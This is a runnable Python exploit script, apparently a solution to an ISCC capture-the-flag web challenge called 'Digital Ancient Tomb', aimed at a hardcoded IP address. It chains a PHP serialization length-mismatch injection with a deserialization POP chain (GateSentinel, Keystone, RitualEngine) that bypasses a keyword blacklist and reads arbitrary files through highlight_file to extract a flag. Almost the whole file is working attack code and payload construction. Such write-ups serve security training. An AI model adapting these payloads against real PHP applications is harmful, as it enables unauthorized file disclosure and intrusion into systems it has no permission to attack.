#!/usr/bin/env python3
"""
Digital Ancient Tomb (数字古墓) - ISCC CTF Web Exploit

Two stages:
  Stage 1 - str_replace length mismatch -> PHP deserialization string length trap
  Stage 2 - PHP deserialization POP chain -> file read via highlight_file()
"""
from __future__ import annotations

import sys
import re
from typing import Any

import requests

DEFAULT_BASE_URL = "http://39.105.213.28:10026"
FLAG_RE = re.compile(rb"(ISCC\{[^}]+\})")


# -- PHP serialization helpers ------------------------------------------------

def _ser_string(s: str) -> str:
    return f's:{len(s)}:"{s}";'


def _ser_array(d: dict[str | int, Any]) -> str:
    items = "".join(
        f'{"i:" + str(k) + ";" if isinstance(k, int) else _ser_string(k)}'
        f'{_php_value(v)}'
        for k, v in d.items()
    )
    return f'a:{len(d)}:{{{items}}}'


def _ser_object(class_name: str, props: list[tuple[str, Any]]) -> str:
    prop_str = "".join(
        _ser_string(name) + _php_value(val)
        for name, val in props
    )
    return f'O:{len(class_name)}:"{class_name}":{len(props)}:{{{prop_str}}}'


def _php_value(v: Any) -> str:
    if isinstance(v, str):
        return _ser_string(v)
    if isinstance(v, int):
        return f'i:{v};'
    if isinstance(v, bool):
        return f'b:{int(v)};'
    if isinstance(v, list):
        return _ser_array(dict(enumerate(v)))
    if isinstance(v, dict):
        return _ser_array(v)
    if v is None:
        return 'N;'
    if hasattr(v, 'php_serialize'):
        return v.php_serialize()
    raise TypeError(f"unsupported type: {type(v)}")


class PHPObject:
    """Represents a PHP object, supports recursive serialization."""
    def __init__(self, class_name: str, props: list[tuple[str, Any]]):
        self.class_name = class_name
        self.props = props

    def php_serialize(self) -> str:
        return _ser_object(self.class_name, self.props)


# -- Stage 1: Rune Trial ------------------------------------------------------

def exploit_stage1(base_url: str) -> str:
    """
    Exploit the str_replace("amgoinvc", "iscc", $serialized) length bug.

    "bnhpjowd" minus 1 per char = "amgoinvc" (8 bytes), replaced by "iscc" (4 bytes).
    Fill $x with 4 copies of "amgoinvc" (32 bytes). After replacement it becomes
    16 bytes, creating a 16-byte gap in the serialized string.

    The $p parameter injects fake properties:
      ";s:1:"y";s:8:"admin123";}
    Deserialization reads past the shortened $x value and parses the injected
    payload, setting $y = "admin123" to trigger __wakeup().
    """
    params = {
        "d": "amgoinvc" * 4,
        "p": '";s:1:"y";s:8:"admin123";}',
    }
    resp = requests.get(f"{base_url}/rune_trial.php", params=params, timeout=10)
    matches = re.findall(rb"([A-Za-z0-9_-]+\.txt)", resp.content)
    if not matches:
        raise RuntimeError("Stage 1 failed: no filename found in response")
    return matches[-1].decode()


# -- Stage 2: Awakening Mechanism ---------------------------------------------

def build_stage2_payload(filename: str) -> str:
    """
    Build the PHP deserialization POP chain payload.

    Trigger chain:
      GateSentinel::__wakeup()
        -> preg_match() casts $this->object to string
        -> GateSentinel::__toString()
          -> $this->tool["blade"]->object   (accessing undefined property)
          -> Keystone::__get("object")
            -> is_callable($this->center) -> RitualEngine has __invoke()
            -> RitualEngine::__invoke()
              -> unserialize($this->callback) -> [RitualEngine, "view"]
              -> $engine->run()  (via $map["view"] => "run")
                -> highlight_file($this->target)

    Bypassing __wakeup() blacklist:
      The outer GateSentinel::$object holds another GateSentinel object
      (no sensitive strings like "flag"/"etc"/"..").
      The real filename is buried in RitualEngine::$target.
    """
    # Innermost: the actual file reader
    reader = PHPObject("RitualEngine", [
        ("\x00*\x00settings", None),
        ("target", filename),
        ("callback", None),
    ])
    action = _php_value([reader, "view"])

    # Middle: invoked by Keystone::__get(), triggers __invoke()
    invoker = PHPObject("RitualEngine", [
        ("\x00*\x00settings", None),
        ("target", None),
        ("callback", action),
    ])

    # Triggers __get when GateSentinel::__toString() accesses ->object
    blade = PHPObject("Keystone", [
        ("center", invoker),
    ])

    # Inner GateSentinel: holds the blade in tool["blade"]
    inner = PHPObject("GateSentinel", [
        ("object", None),
        ("tool", {"blade": blade}),
    ])

    # Outer GateSentinel: __wakeup() calls preg_match on this->object
    # which triggers __toString() on the inner GateSentinel.
    outer = PHPObject("GateSentinel", [
        ("object", inner),
        ("tool", None),
    ])

    return _php_value(outer)


def exploit_stage2(base_url: str, filename: str) -> str:
    payload = build_stage2_payload(filename)
    resp = requests.post(
        f"{base_url}/mechanism_chamber.php",
        data={"data": payload},
        timeout=10,
    )
    match = FLAG_RE.search(resp.content)
    if not match:
        raise RuntimeError("Stage 2 failed: no flag found in response")
    return match.group(1).decode()


# -- Main ---------------------------------------------------------------------

def main() -> int:
    import argparse
    parser = argparse.ArgumentParser(description="Digital Ancient Tomb exploit")
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL)
    parser.add_argument("--filename", help="skip stage 1, use known filename")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")

    try:
        fn = args.filename or exploit_stage1(base_url)
        flag = exploit_stage2(base_url, fn)
    except Exception as e:
        print(f"[-] {e}", file=sys.stderr)
        return 1

    print(f"[+] stage1 filename: {fn}")
    print(f"[+] flag: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
